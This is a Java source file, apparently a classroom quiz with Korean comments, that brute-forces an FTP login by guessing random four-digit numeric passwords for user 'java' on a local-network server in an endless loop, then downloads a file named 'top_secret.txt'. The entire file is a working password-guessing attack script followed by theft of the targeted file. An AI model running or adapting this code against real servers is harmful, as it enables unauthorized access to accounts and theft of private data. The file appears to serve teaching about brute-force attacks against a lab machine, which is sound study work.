import java.io.File;
import java.util.Random;

import it.sauronsoftware.ftp4j.FTPClient;

// - Brute Force 해킹 : 무작위 대입 공격
public class Quiz_02 {
	public static void main(String[] args) {
		FTPClient client = new FTPClient();
		try {
			client.connect("192.168.0.161");
		} catch (Exception e) {
			e.printStackTrace(); // 에러 발생 사유 제공
			return;
		}

		while (true) {
			String password = generateRandomPassword(4);
			try {
				client.login("java", password);
				break;
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

		try {
			client.download("top_secret.txt", new File("C:\\Users\\타리\\Desktop\\MKY\\workspace\\downloads\\down.txt"));
			// 다운로드할 파일 이름 / 다운받을위치 new File(경로)
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static String generateRandomPassword(int length) {
		// 비밀번호로 사용할 문자열
		String characters = "0123456789";

		// 무작위 숫자를 생성하는 랜덤 객체 생성
		Random random = new Random();

		// 무작위 비밀번호 생성
		StringBuilder passwordBuilder = new StringBuilder();
		for (int i = 0; i < length; i++) {
			// characters 문자열에서 무작위 인덱스를 선택하여 비밀번호에 추가
			int randomIndex = random.nextInt(characters.length());
			char randomChar = characters.charAt(randomIndex);
			passwordBuilder.append(randomChar);
		}
		return passwordBuilder.toString();
	}
}
